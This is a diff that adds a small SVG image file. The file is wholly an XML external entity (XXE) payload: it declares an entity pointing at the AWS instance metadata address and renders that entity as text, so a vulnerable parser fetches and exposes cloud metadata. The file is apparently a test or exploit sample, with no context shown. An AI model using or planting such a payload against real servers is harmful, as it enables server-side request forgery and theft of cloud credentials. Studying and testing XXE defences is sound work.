@@ -1,0 +1,7 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+<!ENTITY awsdata SYSTEM "http://169.254.169.254/latest/meta-data/">
+]>
+<svg width="500" height="500" xmlns="http://www.w3.org/2000/svg">
+  <text x="10" y="50">&awsdata;</text>
+</svg>
